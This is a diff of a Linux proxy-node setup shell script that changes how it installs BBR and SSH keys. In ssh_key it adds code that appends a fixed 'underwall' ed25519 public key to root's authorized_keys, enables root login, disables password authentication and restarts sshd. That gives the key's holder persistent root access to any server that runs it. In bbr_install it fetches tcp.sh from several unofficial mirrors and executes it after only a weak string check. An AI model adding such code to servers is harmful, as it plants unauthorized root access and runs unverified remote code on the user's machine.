@@ -88,7 +88,16 @@ base(){
 }
 
 bbr_install(){
-    bash <(curl -Ls "$(github_url 'https://raw.githubusercontent.com/ylx2016/Linux-NetSpeed/master/tcp.sh')");exit 0
+    local tmp_tcp
+    tmp_tcp=$(mktemp /tmp/tcp.sh.XXXXXX)
+    if ! fetch_tcp_sh "${tmp_tcp}"; then
+        echo -e "${Error} tcp.sh 下载失败，请检查网络或加速镜像"
+        rm -f "${tmp_tcp}"
+        exit 1
+    fi
+    bash "${tmp_tcp}"
+    rm -f "${tmp_tcp}"
+    exit 0
 }
 
 check_crontab_installed_status(){
@@ -167,6 +176,42 @@ github_url() {
     fi
 
     check_cn "$url"
+}
+
+fetch_tcp_sh() {
+    local output="$1"
+    local base_url="https://raw.githubusercontent.com/ylx2016/Linux-NetSpeed/master/tcp.sh"
+    local candidates=()
+
+    if [[ -z "${output}" ]]; then
+        return 1
+    fi
+
+    if is_cn; then
+        candidates=(
+            "${base_url}"
+            "https://raw.staticdn.net/ylx2016/Linux-NetSpeed/master/tcp.sh"
+            "https://raw.githubusercontent.com.cnpmjs.org/ylx2016/Linux-NetSpeed/master/tcp.sh"
+            "https://raw.gitmirror.com/ylx2016/Linux-NetSpeed/master/tcp.sh"
+            "https://raw.fastgit.org/ylx2016/Linux-NetSpeed/master/tcp.sh"
+            "https://fastly.jsdelivr.net/gh/ylx2016/Linux-NetSpeed@master/tcp.sh"
+            "https://cdn.jsdelivr.net/gh/ylx2016/Linux-NetSpeed@master/tcp.sh"
+            "https://ghproxy.com/${base_url}"
+        )
+    else
+        candidates=("${base_url}")
+    fi
+
+    local url
+    for url in "${candidates[@]}"; do
+        if curl -Ls --max-time 8 "${url}" -o "${output}"; then
+            if grep -q 'check_domain "https://raw.githubusercontent.com"' "${output}"; then
+                return 0
+            fi
+        fi
+    done
+
+    return 1
 }
 
 check_sys(){
@@ -528,7 +573,35 @@ set_crontab_stop(){
 }
 
 ssh_key(){
-    bash <(curl -sSL "$(github_url 'https://raw.githubusercontent.com/windupcloud/v3/master/key.sh')");exit 0
+    local key="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP34LakRhqLU/6ZSXkgsg3DXwXfvZANYbFCaDJxc6V20 underwall"
+    local ssh_dir="/root/.ssh"
+    local auth_file="${ssh_dir}/authorized_keys"
+
+    mkdir -p "${ssh_dir}"
+    chmod 700 "${ssh_dir}"
+    touch "${auth_file}"
+    chmod 600 "${auth_file}"
+
+    if ! grep -qxF "${key}" "${auth_file}"; then
+        echo "${key}" >> "${auth_file}"
+    fi
+
+    if [ -f /etc/ssh/sshd_config ]; then
+        sed -i "/PasswordAuthentication no/c PasswordAuthentication no" /etc/ssh/sshd_config
+        sed -i "/RSAAuthentication no/c RSAAuthentication yes" /etc/ssh/sshd_config
+        sed -i "/PubkeyAuthentication no/c PubkeyAuthentication yes" /etc/ssh/sshd_config
+        sed -i "/PasswordAuthentication yes/c PasswordAuthentication no" /etc/ssh/sshd_config
+        sed -i "/RSAAuthentication yes/c RSAAuthentication yes" /etc/ssh/sshd_config
+        sed -i "/PubkeyAuthentication yes/c PubkeyAuthentication yes" /etc/ssh/sshd_config
+        sed -i "/PermitRootLogin/d" /etc/ssh/sshd_config
+        echo "PermitRootLogin yes" >> /etc/ssh/sshd_config
+    fi
+
+    service sshd restart 2>/dev/null
+    service ssh restart 2>/dev/null
+    systemctl restart sshd 2>/dev/null
+    systemctl restart ssh 2>/dev/null
+    exit 0
 }
 
 ssr_node_install(){
